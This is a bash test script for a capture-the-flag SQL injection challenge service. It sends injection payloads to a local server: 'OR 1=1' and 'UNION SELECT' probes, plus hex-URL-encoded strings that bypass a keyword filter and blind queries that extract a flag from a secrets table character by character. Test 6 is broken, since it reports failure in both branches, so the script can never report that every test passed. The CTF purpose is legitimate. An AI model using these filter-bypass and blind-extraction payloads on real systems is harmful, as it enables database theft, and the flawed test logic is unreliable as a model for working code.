#!/bin/bash

# CTF SQL Injection Service - Test Script
# This script verifies that the service is working correctly

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuration
BASE_URL="${1:-http://localhost:5050}"
PASSED=0
FAILED=0

print_test() {
    echo -e "${BLUE}[TEST]${NC} $1"
}

print_pass() {
    echo -e "${GREEN}[PASS]${NC} $1"
    PASSED=$((PASSED + 1))
}

print_fail() {
    echo -e "${RED}[FAIL]${NC} $1"
    FAILED=$((FAILED + 1))
}

print_info() {
    echo -e "${YELLOW}[INFO]${NC} $1"
}

echo "======================================"
echo "  CTF SQL Injection Service Tests"
echo "======================================"
echo "Target: $BASE_URL"
echo ""

# Test 1: Health check
print_test "Health check endpoint"
if curl -s "$BASE_URL/health" | grep -q "OK"; then
    print_pass "Health check returns OK"
else
    print_fail "Health check failed"
fi

# Test 2: Index page loads
print_test "Index page loads"
if curl -s "$BASE_URL/" | grep -q "User Directory"; then
    print_pass "Index page accessible"
else
    print_fail "Index page not accessible"
fi

# Test 3: Valid user search
print_test "Valid user search (ID 1)"
if curl -s "$BASE_URL/search?id=1" | grep -q "User Found"; then
    print_pass "Valid user search works"
else
    print_fail "Valid user search failed"
fi

# Test 4: Invalid user search
print_test "Invalid user search (ID 999)"
if curl -s "$BASE_URL/search?id=999" | grep -q "User Not Found"; then
    print_pass "Invalid user search works"
else
    print_fail "Invalid user search failed"
fi

# Test 5: WAF blocks simple SQL injection
print_test "WAF blocks OR injection"
if curl -s "$BASE_URL/search?id=1%20OR%201=1" | grep -q "Malicious input detected"; then
    print_pass "WAF blocks OR keyword"
else
    print_fail "WAF does not block OR keyword"
fi

# Test 6: WAF blocks AND injection
print_test "WAF blocks AND injection"
if curl -s "$BASE_URL/search?id=1%20AND%201=1" | grep -q "Malicious input detected"; then
    print_fail "WAF blocks AND keyword"
else
    print_fail "WAF does not block AND keyword"
fi

# Test 7: WAF blocks SELECT injection
print_test "WAF blocks SELECT injection"
if curl -s "$BASE_URL/search?id=1%20UNION%20SELECT%201,2,3" | grep -q "Malicious input detected"; then
    print_pass "WAF blocks SELECT keyword"
else
    print_fail "WAF does not block SELECT keyword"
fi

# Test 8: URL encoded bypass works (vulnerability exists)
print_test "URL encoded SQL injection bypasses WAF"
# Encoded: "1 AND (select 1 from secrets)=1"
ENCODED_PAYLOAD="1%20%41%4e%44%20%28%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%73%65%63%72%65%74%73%29%3d%31"
RESPONSE=$(curl -s "$BASE_URL/search?id=$ENCODED_PAYLOAD")
if echo "$RESPONSE" | grep -q "User Found"; then
    print_pass "SQL injection vulnerability confirmed (URL encoding bypasses WAF)"
else
    print_fail "SQL injection bypass not working"
fi

# Test 9: Blind SQLi - check first character
print_test "Blind SQLi - extracting first character of flag"
# Encoded: "1 AND (select 1 from secrets where substr(secret_value,1,1)='c')=1"
ENCODED_CHECK="1%20%41%4e%44%20%28%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%73%65%63%72%65%74%73%20%77%68%65%72%65%20%73%75%62%73%74%72%28%73%65%63%72%65%74%5f%76%61%6c%75%65%2c%31%2c%31%29%3d%27%63%27%29%3d%31"
if curl -s "$BASE_URL/search?id=$ENCODED_CHECK" | grep -q "User Found"; then
    print_pass "First character 'c' confirmed (flag starts with 'centralctf')"
else
    print_fail "Character extraction not working"
fi

# Test 10: Database structure check
print_test "Secrets table exists"
# Encoded: "1 AND (select 1 from secrets limit 1)=1"
TABLE_CHECK="1%20%41%4e%44%20%28%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%73%65%63%72%65%74%73%20%6c%69%6d%69%74%20%31%29%3d%31"
if curl -s "$BASE_URL/search?id=$TABLE_CHECK" | grep -q "User Found"; then
    print_pass "Secrets table is accessible"
else
    print_fail "Secrets table not accessible"
fi

echo ""
echo "======================================"
echo "  Test Results"
echo "======================================"
echo -e "${GREEN}Passed: $PASSED${NC}"
echo -e "${RED}Failed: $FAILED${NC}"
echo ""

if [ $FAILED -eq 0 ]; then
    echo -e "${GREEN}✓ All tests passed! Service is ready for CTF.${NC}"
    echo ""
    echo "Next steps:"
    echo "  1. Run exploit script: python3 exploit.py"
    echo "  2. Check SOLUTION.md for full writeup"
    echo "  3. Deploy to production environment"
    exit 0
else
    echo -e "${RED}✗ Some tests failed. Please check the service.${NC}"
    echo ""
    echo "Debugging:"
    echo "  - Check logs: docker-compose logs"
    echo "  - Verify database: docker-compose exec ctf-sqli ls -la"
    echo "  - Restart service: docker-compose restart"
    exit 1
fi
